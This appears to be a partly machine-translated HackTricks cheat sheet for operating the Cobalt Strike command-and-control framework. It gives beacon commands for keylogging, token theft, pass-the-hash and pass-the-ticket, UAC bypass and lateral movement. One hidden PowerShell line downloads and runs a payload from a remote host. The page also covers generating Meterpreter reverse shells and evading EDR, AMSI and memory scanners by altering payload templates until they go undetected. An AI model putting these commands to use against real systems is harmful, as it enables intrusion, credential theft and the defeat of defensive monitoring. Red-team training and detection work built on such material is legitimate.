# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll ili service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Prilagođeni implantati / Linux Beacons

- Prilagođenom agentu je dovoljno da govori Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) da se registruje/check-in i primi zadatke. Implementirajte iste URIs/headers/metadata crypto definisane u profilu da biste ponovo koristili Cobalt Strike UI za tasking i output.
- An Aggressor Script (npr. `CustomBeacon.cna`) može obuhvatiti generisanje payload-a za non-Windows beacon tako da operatori mogu izabrati listener i proizvesti ELF payload-e direktno iz GUI.
- Primer Linux task handler-a izloženih Team Server-u: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, i `exit`. Ovi mapiraju na task IDs koje Team Server očekuje i moraju biti implementirani server-side da vrate output u ispravnom formatu.
- BOF podrška na Linuxu može se dodati učitavanjem Beacon Object Files in-process sa [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (podržava i Outflank-style BOFs), omogućavajući modularni post-exploitation da radi unutar konteksta/privilegija implanta bez spawn-ovanja novih procesa.
- Ugradite SOCKS handler u prilagođeni beacon da biste održali pivoting parity sa Windows Beacons: kada operator pokrene `socks <port>` implant bi trebalo da otvori lokalni proxy za usmeravanje operator toolinga kroz kompromitovani Linux host u interne mreže.

## Opsec

### Execute-Assembly

The **`execute-assembly`** koristi **sacrificial process** i remote process injection da izvrši označeni program. Ovo je veoma noisy jer se za injektovanje u proces koriste određeni Win APIs koje svaki EDR proverava. Međutim, postoje neki custom alati koji se mogu koristiti da se nešto učita u isti proces:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike-u takođe možete koristiti BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

The agressor script `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike-u koja će obojiti komande indikujući da li su BOFs (green), da li su Frok&Run (yellow) i slično, ili da li su ProcessExecution, injection ili slično (red). To pomaže da se zna koje su komande stealthier.

### Ponašaj se kao korisnik

Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sve interaktivne logon-e da biste znali uobičajeno radno vreme.
- System EID 12,13 - Proverite učestalost shutdown/startup/sleep događaja.
- Security EID 4624/4625 - Proverite inbound validne/nevalidne NTLM pokušaje.
- Security EID 4648 - Ovaj događaj se kreira kada se plaintext credentials koriste za logon. Ako ga je generisao proces, binary potencijalno ima credentials u clear text-u u config fajlu ili unutar koda.

Kada koristite `jump` iz Cobalt Strike-a, bolje je koristiti `wmi_msbuild` metodu da novi proces izgleda legitimnije.

### Koristite račune računara

Često odbrambeni timovi prate čudna ponašanja generisana od korisnika i **isključuju service accounts i computer accounts kao `*$` iz svog monitoring-a**. Možete koristiti ove naloge za lateral movement ili privilege escalation.

### Koristite stageless payload-e

Stageless payload-i su manje noisy od staged jer ne trebaju da preuzimaju drugu fazu sa C2 servera. To znači da ne generišu mrežni saobraćaj nakon inicijalne konekcije, što ih čini manje verovatnim da budu detektovani od strane mrežnih odbrana.

### Tokens & Token Store

Budite oprezni kada kradete ili generišete tokene jer može biti moguće da EDR izlista sve tokene svih thread-ova i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM-u u procesu.

To omogućava skladištenje tokena **po beacon-u** tako da nije potrebno krasti isti token iznova i iznova. Ovo je korisno za lateral movement ili kada treba više puta koristiti ukradeni token:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Prilikom lateralnog kretanja, obično je bolje **ukrasti token nego generisati novi** ili izvesti pass the hash napad.

### Guardrails

Cobalt Strike ima funkciju zvanu **Guardrails** koja pomaže da se spreči korišćenje određenih komandi ili akcija koje bi mogle biti detektovane od strane odbrambenih timova. Guardrails se mogu konfigurisati da blokiraju specifične komande, kao što su `make_token`, `jump`, `remote-exec`, i druge koje se često koriste za lateral movement ili privilege escalation.

Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži neke provere i ideje koje možete razmotriti pre izvršavanja payload-a.

### Tickets encryption

U AD okruženju budite oprezni sa enkripcijom tiketa. Po defaultu, neki alati će koristiti RC4 enkripciju za Kerberos tikete, što je manje sigurno od AES enkripcije, dok će po defaultu ažurna okruženja koristiti AES. Ovo mogu detektovati odbrambeni timovi koji prate slabe enkripcijske algoritme.

### Izbegavajte podrazumevane vrednosti

Kada koristite Cobalt Strike, po defaultu SMB pipe-ovi će imati ime `msagent_####` i `status_####`. Promenite ta imena. Moguće je proveriti imena postojećih pipe-ova iz Cobalt Strike sa komandom: `ls \\.\pipe\`

Takođe, za SSH sesije kreira se pipe pod imenom `\\.\pipe\postex_ssh_####`. Promenite ga pomoću `set ssh_pipename "<new_name>";`.

Takođe u postex exploitation attack pipe-ovi `\\.\pipe\postex_####` mogu se modifikovati sa `set pipename "<new_name>"`.

U Cobalt Strike profilima takođe možete menjati stvari kao što su:

- Izbegavanje korišćenja `rwx`
- Kako process injection ponašanje radi (koji APIs će se koristiti) u bloku `process-inject {...}`
- Kako "fork and run" funkcioniše u bloku `post-ex {…}`
- Vreme spavanja
- Maksimalna veličina binarnih fajlova koji se učitavaju u memoriju
- Memorijski otisak i sadržaj DLL-a u bloku `stage {...}`
- Mrežni saobraćaj

### Bypass memory scanning

Neki EDR-i skeniraju memoriju za poznate malware potpise. Cobalt Strike omogućava modifikaciju `sleep_mask` funkcije kao BOF koji će moći da enkriptuje u memoriji backdoor.

### Noisy proc injections

Kada se injektuje kod u proces, to je obično vrlo noisy, jer **nijedan regularan proces obično ne izvodi ovu akciju i načini za to su veoma ograničeni**. Stoga, može biti detektovano od strane behaviour-based detection sistema. Takođe, može biti detektovano od strane EDR-ova koji skeniraju mrežu za **threads containing code that is not in disk** (iako procesi poput browser-a koji koriste JIT ovo često imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID i PPID odnosi

Prilikom pokretanja novog procesa važno je održavati regularan parent-child odnos između procesa da biste izbegli detekciju. Ako svchost.exe pokreće iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.

Kada se novi beacon spawn-uje u Cobalt Strike-u, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novi listener. Ovo nije posebno stealthy i može se lako detektovati od strane EDR-ova. Štaviše, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:
```bash
spawnto x86 svchost.exe
```
Možete takođe promeniti ovu postavku **`spawnto_x86` i `spawnto_x64`** u profilu.

### Proksiranje saobraćaja napadača

Napadači će ponekad morati da pokreću alate lokalno, čak i na Linux mašinama, i da nateraju saobraćaj žrtava da stigne do alata (npr. NTLM relay).

Takođe, ponekad, da bi izveli pass-the.hash ili pass-the-ticket napad, za napadača je prikrivenije da **doda taj hash ili ticket u sopstveni LSASS proces** lokalno i potom pivotira iz njega umesto da menja LSASS proces žrtve.

Međutim, morate biti **pažljivi sa generisanim saobraćajem**, jer možete slati neuobičajen saobraćaj (Kerberos?) iz vašeg backdoor procesa. Za ovo možete pivotirati na browser proces (iako možete biti otkriveni prilikom injektovanja u proces, pa razmislite o stealth načinu za to).


### Izbegavanje AV-ova

#### AV/AMSI/ETW Bypass

Pogledajte stranicu:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Obično, u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prekompajlirane šablone (u `/src-common`) payload-a koje cobalt strike koristi za generisanje binarnih beacona.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) nad generisanim backdoor-om (ili samo nad kompajliranim šablonom) možete pronaći šta izaziva detekciju od strane defender-a. Obično je to string. Dakle, možete izmeniti kod koji generiše backdoor tako da taj string ne pojavljuje u finalnom binarnom fajlu.

Nakon izmene koda jednostavno pokrenite `./build.sh` iz iste direktorijuma i kopirajte folder `dist-pipe/` u Windows klijent u `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Ne zaboravite da učitate agresivnu skriptu `dist-pipe\artifact.cna` kako biste naterali Cobalt Strike da koristi resurse sa diska koje želimo, a ne one koje je učitao.

#### Resource Kit

Folder ResourceKit sadrži šablone za Cobalt Strike-ove script-based payloads, uključujući PowerShell, VBA i HTA.

Koristeći [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa šablonima možete pronaći šta defender (AMSI u ovom slučaju) ne prihvata i izmeniti to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the detected lines one can generate a template that won't be caught.

Ne zaboravite da učitate agresivni skript `ResourceKit\resources.cna` da naznačite Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koji su već učitani.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike omogućava da zaobiđete ove hooks koristeći **syscalls** umesto standardnih Windows API poziva pomoću **`None`** konfiguracije, ili korišćenjem `Nt*` verzije funkcije sa podešavanjem **`Direct`**, ili jednostavno preskakanjem `Nt*` funkcije sa opcijom **`Indirect`** u malleable profilu. U zavisnosti od sistema, jedna opcija može biti prikrivenija od druge.

Ovo se može podesiti u profilu ili koristeći komandu **`syscall-method`**

Međutim, ovo može biti i bučno.

Jedna opcija koju Cobalt Strike nudi za zaobilaženje hooks-a je uklanjanje tih hooks-a pomoću: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Takođe možete proveriti koje funkcije su hookovane koristeći [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ili [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referencije

- [Cobalt Strike Linux Beacon (prilagođeni implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF šablon](https://github.com/outflanknl/nix_bof_template)
- [Analiza Unit42 o šifrovanju metapodataka Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC dnevnik o saobraćaju Cobalt Strike](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
